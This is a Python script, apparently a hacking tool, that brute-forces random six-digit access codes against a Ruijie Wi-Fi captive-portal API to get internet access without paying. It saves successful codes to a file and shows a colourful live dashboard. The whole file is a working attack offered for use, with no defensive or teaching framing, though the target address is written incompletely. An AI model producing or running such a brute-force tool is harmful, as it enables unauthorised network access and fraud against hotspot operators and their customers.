import os, sys, time, random, string, asyncio, aiohttp, argparse, ping3
from datetime import datetime

# Colors
w, g, y, r, b, cyan = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

def Logo():
    os.system("clear")
    logo = f"""
{r} ██████  ███████ ██   ██ 
{r} ██   ██ ██       ██ ██  
{r} ██   ██ █████     ███   
{r} ██   ██ ██       ██ ██  
{r} ██████  ███████ ██   ██ 
{w} ───────────────────────
{w}  BY: {y}TUNAUNGKYAW {w}| {g}v2.0 (Stable){w}
    """
    print(logo)
    print(f"{cyan}{'='*os.get_terminal_size().columns}")
    print(f"{w}[*] Target: Ruijie Network Bypass (Auto-Generate Mode)")
    print(f"{cyan}{'='*os.get_terminal_size().columns}")

class RuijieBypass:
    def __init__(self):
        self.target_url = "http://192.168.99" # Default Ruijie API
        self.total_tried = 0
        self.hits = 0

    def generate_code(self, length=6):
        # Wordlist မလိုဘဲ 6-digit code တွေကို random ထုတ်ပေးတဲ့ logic
        return ''.join(random.choices(string.digits, k=length))

    async def check_internet(self, session):
        try:
            async with session.get("http://gstatic.com", timeout=2) as r:
                return r.status == 204
        except: return False

    async def attack(self):
        Logo()
        print(f"{g}[+] Starting Bypass Process... Press CTRL+C to stop.")
        async with aiohttp.ClientSession() as session:
            while True:
                code = self.generate_code()
                self.total_tried += 1
                now = datetime.now().strftime("%H:%M:%S")
                
                # Ruijie API ဆီ လှမ်းပို့တဲ့အပိုင်း
                try:
                    payload = {"accessCode": code, "apiVersion": 1}
                    async with session.post(self.target_url, json=payload, timeout=3) as resp:
                        res_text = await resp.text()
                        status = f"{g}SUCCESS" if "true" in res_text.lower() else f"{r}FAILED"
                        if "true" in res_text.lower(): 
                            self.hits += 1
                            with open("success_hits.txt", "a") as f: f.write(f"[{now}] {code}\n")
                except:
                    status = f"{y}RETRYING"

                # Dashboard Display
                ping_val = ping3.ping('8.8.8.8', timeout=1)
                ping_str = f"{g}{int(ping_val*1000)}ms" if ping_val else f"{r}No-Inet"
                
                sys.stdout.write(f"\r{w}[{now}] {w}Code: {b}{code} {w}| Status: {status} {w}| Hits: {g}{self.hits} {w}| Ping: {ping_str}  ")
                sys.stdout.flush()
                await asyncio.sleep(0.1) # မြန်နှုန်းကို ဒီမှာ ပြင်လို့ရပါတယ်

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["internet", "setup"], required=True)
    args = parser.parse_args()

    if args.option == "setup":
        Logo()
        print(f"{g}[+] Installing requirements...")
        os.system("pip install aiohttp ping3 requests")
        print(f"{g}[+] Setup Done! Run: python skb.py -o internet")
    elif args.option == "internet":
        try:
            asyncio.run(RuijieBypass().attack())
        except KeyboardInterrupt:
            print(f"\n{r}[!] Stopped.")

if __name__ == "__main__":
    main()
